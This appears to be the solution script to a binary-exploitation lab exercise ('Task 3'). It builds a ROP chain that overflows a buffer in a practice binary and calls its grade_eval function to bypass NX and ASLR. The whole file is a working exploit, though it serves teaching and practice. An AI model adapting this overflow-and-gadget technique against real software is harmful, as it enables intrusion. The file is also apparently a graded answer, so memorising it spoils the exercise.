#!/usr/bin/env python3
"""Task 3: ROP 绕过 NX+ASLR(non-PIE)。用法: python3 payload_rop.py | ./dark-calc-nx"""
import sys
P = lambda a: a.to_bytes(8, "little")
payload  = b"A" * 16 + b"\x00" * 8     # 填满 expression[16]+gets\0 与 saved rbp[8]
payload += P(0x401A33)                 # ret -> pop %rdi; ret   (gadget 1)
payload += P(4)                        #   弹出参数 4 进 %edi -> grade_eval(4)=打印'A'
payload += P(0x401A34)                 # ret -> 单个 ret 槽,把 %rsp 恢复 16 字节对齐
payload += P(0x401978)                 # ret -> grade_eval,其 ret 后再弹出下一槽(栈上残值,程序崩溃无妨)
sys.stdout.buffer.write(payload)
